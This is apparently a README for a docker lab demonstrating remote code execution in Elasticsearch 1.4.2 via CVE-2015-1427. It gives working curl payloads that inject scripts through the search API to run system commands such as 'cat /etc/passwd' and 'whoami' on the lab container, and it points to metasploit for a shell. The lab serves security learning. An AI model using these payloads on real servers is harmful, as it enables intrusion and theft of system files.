# Remote Code Execution in a vulnerable Elasticsearch container

PoC rely on *CVE-2015-1427* exploitation https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1427

## Pre-requisites
- docker
- docker-compose

#### Launch containers

`docker-compose up -d`

Enter in attacker container and play a little with Elastic RCE with `docker exec -it elhackstic_badguy_1 bash`

Check if elastic is responding
```bash 
ping elhackstic_vulnerable_1
```

or 
```bash
curl http://elhackstic_vulnerable_1:9200
```

elastic API will reply :
```
{
  "status" : 200,
  "name" : "Namorita",
  "cluster_name" : "elasticsearch",
  "version" : {
    "number" : "1.4.2",
    "build_hash" : "927caff6f05403e936c20bf4529f144f0c89fd8c",
    "build_timestamp" : "2014-12-16T14:11:12Z",
    "build_snapshot" : false,
    "lucene_version" : "4.10.2"
  },
  "tagline" : "You Know, for Search"
}
```

example of data creation :
```bash 
curl -XPUT 'http://elhackstic_vulnerable_1:9200/twitter/user/yren' -d '{ "name" : "Wu" }'

{"_index":"twitter","_type":"user","_id":"yren","_version":1,"created":true}
```

#### Let's play with code injection

Information gathering

```bash
curl -XPOST 'http://elhackstic_vulnerable_1:9200/_search?pretty' -d '{"script_fields": {"payload": {"script": "java.lang.Math.class.forName(\"java.lang.System\").getProperty(\"os.name\")"}}}'
```

```bash
curl -XPOST 'http://elhackstic_vulnerable_1:9200/_search?pretty' -d '{"script_fields": {"payload": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getText()"}}}'
```

```bash
curl -XPOST 'http://elhackstic_vulnerable_1:9200/_search?pretty' -d '{"script_fields": {"payload": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\").getText()"}}}'
```

```
...
        "payload" : [ "root\n" ]
...
```

Finally you easily can get a shell with metasploit.

or try https://github.com/XiphosResearch/exploits/tree/master/ElasticSearch

#### Sources

https://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/
https://www.exploit-db.com/exploits/36337/
https://www.exploit-db.com/exploits/36415/
